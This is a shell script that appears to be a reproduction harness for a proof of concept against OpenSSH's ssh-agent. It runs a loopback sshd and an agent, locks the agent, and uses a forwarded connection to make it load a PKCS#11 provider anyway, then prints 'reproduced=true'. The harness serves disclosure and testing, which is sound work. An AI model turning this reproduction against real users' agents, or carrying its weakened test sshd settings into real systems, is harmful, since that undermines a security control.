set -eu

BASE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
PREFIX=${OPENSSH_PREFIX:-/usr/local}
SSH=${SSH:-$PREFIX/bin/ssh}
SSHD=${SSHD:-$PREFIX/sbin/sshd}
SSH_AGENT=${SSH_AGENT:-$PREFIX/bin/ssh-agent}
SSH_KEYGEN=${SSH_KEYGEN:-$PREFIX/bin/ssh-keygen}
PYTHON=${PYTHON:-python3}
PROVIDER=${PROVIDER:-/usr/lib/x86_64-linux-gnu/pkcs11/p11-kit-trust.so}
PORT=${PORT:-22991}
HOLD=${HOLD:-3}
KEEP=${KEEP:-0}
WORK_ROOT=${WORK_ROOT:-${TMPDIR:-/tmp}}
LOGIN_USER=${LOGIN_USER:-$(id -un)}

mkdir -p -- "$WORK_ROOT"
WORK_ROOT=$(CDPATH= cd -- "$WORK_ROOT" && pwd)
WORK=$WORK_ROOT/openssh-agent-lock-$$
mkdir -m 700 -- "$WORK"

agent_pid=
client_pid=
sshd_pid=
needs_sudo=0

cleanup() {
    set +e
    if [ -n "$client_pid" ]; then
        kill "$client_pid" 2>/dev/null
        wait "$client_pid" 2>/dev/null
    fi
    if [ -n "$agent_pid" ]; then
        kill "$agent_pid" 2>/dev/null
        wait "$agent_pid" 2>/dev/null
    fi
    if [ -n "$sshd_pid" ]; then
        if [ "$needs_sudo" -eq 1 ]; then
            sudo -n kill "$sshd_pid" 2>/dev/null
        else
            kill "$sshd_pid" 2>/dev/null
        fi
        wait "$sshd_pid" 2>/dev/null
    fi
    if [ "$KEEP" -ne 1 ]; then
        case "$WORK" in
            "$WORK_ROOT"/openssh-agent-lock-*) rm -rf -- "$WORK" ;;
        esac
    fi
}

trap cleanup EXIT HUP INT TERM

for binary in "$SSH" "$SSHD" "$SSH_AGENT" "$SSH_KEYGEN"; do
    if [ ! -x "$binary" ]; then
        printf 'missing_binary=%s\n' "$binary" >&2
        exit 1
    fi
done

if [ ! -f "$PROVIDER" ]; then
    printf 'missing_provider=%s\n' "$PROVIDER" >&2
    exit 1
fi

if [ "$(id -u)" -ne 0 ]; then
    sudo -v
    needs_sudo=1
fi

"$SSH_KEYGEN" -q -t ed25519 -N '' -f "$WORK/host_key"
"$SSH_KEYGEN" -q -t ed25519 -N '' -f "$WORK/client_key"
cp -- "$WORK/client_key.pub" "$WORK/authorized_keys"
chmod 600 "$WORK/authorized_keys"

if [ "$(id -u)" -eq 0 ] && [ "$LOGIN_USER" != root ]; then
    chown "$LOGIN_USER" "$WORK/authorized_keys"
    chmod 711 "$WORK"
fi

{
    printf 'Port %s\n' "$PORT"
    printf 'ListenAddress 127.0.0.1\n'
    printf 'HostKey %s\n' "$WORK/host_key"
    printf 'PidFile %s\n' "$WORK/sshd.pid"
    printf 'AuthorizedKeysFile %s\n' "$WORK/authorized_keys"
    printf 'PubkeyAuthentication yes\n'
    printf 'AuthenticationMethods publickey\n'
    printf 'PasswordAuthentication no\n'
    printf 'KbdInteractiveAuthentication no\n'
    printf 'StrictModes no\n'
    printf 'AllowAgentForwarding yes\n'
    printf 'AllowTcpForwarding no\n'
    printf 'X11Forwarding no\n'
    printf 'PermitTunnel no\n'
    printf 'PermitRootLogin yes\n'
    printf 'UseDNS no\n'
    printf 'LogLevel DEBUG3\n'
    printf 'Subsystem sftp internal-sftp\n'
} >"$WORK/sshd_config"

"$SSH_AGENT" -d -a "$WORK/agent.sock" >"$WORK/agent.log" 2>&1 &
agent_pid=$!

i=0
while [ ! -S "$WORK/agent.sock" ]; do
    if ! kill -0 "$agent_pid" 2>/dev/null; then
        sed -n '1,160p' "$WORK/agent.log" >&2
        exit 1
    fi
    i=$((i + 1))
    if [ "$i" -ge 200 ]; then
        exit 1
    fi
    sleep 0.05
done

if [ "$needs_sudo" -eq 1 ]; then
    sudo -n "$SSHD" -t -f "$WORK/sshd_config"
    sudo -n "$SSHD" -D -f "$WORK/sshd_config" -E "$WORK/sshd.log" &
else
    "$SSHD" -t -f "$WORK/sshd_config"
    "$SSHD" -D -f "$WORK/sshd_config" -E "$WORK/sshd.log" &
fi
sshd_pid=$!

i=0
while ! grep -Fq "Server listening on 127.0.0.1 port $PORT" "$WORK/sshd.log" 2>/dev/null; do
    if ! kill -0 "$sshd_pid" 2>/dev/null; then
        sed -n '1,160p' "$WORK/sshd.log" >&2
        exit 1
    fi
    i=$((i + 1))
    if [ "$i" -ge 200 ]; then
        sed -n '1,160p' "$WORK/sshd.log" >&2
        exit 1
    fi
    sleep 0.05
done

"$PYTHON" "$BASE/poc.py" control lock --socket "$WORK/agent.sock"

SSH_AUTH_SOCK="$WORK/agent.sock" "$SSH" -vv -A -p "$PORT" \
    -i "$WORK/client_key" \
    -o IdentitiesOnly=yes \
    -o BatchMode=yes \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 \
    "$LOGIN_USER@127.0.0.1" \
    "$PYTHON $BASE/poc.py probe --provider $PROVIDER --hold $HOLD" \
    >"$WORK/remote.out" 2>"$WORK/client.log" &
client_pid=$!

i=0
while ! grep -Fq 'forwarded_socket_connected=true' "$WORK/remote.out" 2>/dev/null; do
    if ! kill -0 "$client_pid" 2>/dev/null; then
        sed -n '1,200p' "$WORK/client.log" >&2
        exit 1
    fi
    i=$((i + 1))
    if [ "$i" -ge 200 ]; then
        sed -n '1,200p' "$WORK/client.log" >&2
        exit 1
    fi
    sleep 0.05
done

"$PYTHON" "$BASE/poc.py" control unlock --socket "$WORK/agent.sock"

if ! wait "$client_pid"; then
    client_pid=
    sed -n '1,200p' "$WORK/client.log" >&2
    exit 1
fi
client_pid=

grep -Fq 'client_request_agent: ssh_agent_bind_hostkey: agent refused operation' "$WORK/client.log"
grep -Fq 'new agent-connection [authentication agent connection]' "$WORK/client.log"
grep -Fq 'pkcs11_start_helper: starting' "$WORK/agent.log"
grep -Fq "provider $PROVIDER: manufacturerID" "$WORK/agent.log"

cat "$WORK/remote.out"
printf 'target=%s\n' "$("$SSH" -V 2>&1)"
printf 'session_bind_refused_while_locked=true\n'
printf 'forwarded_channel_opened=true\n'
printf 'provider_helper_started=true\n'
printf 'provider_initialized=true\n'
printf 'reproduced=true\n'

if [ "$KEEP" -eq 1 ]; then
    printf 'evidence_directory=%s\n' "$WORK"
fi
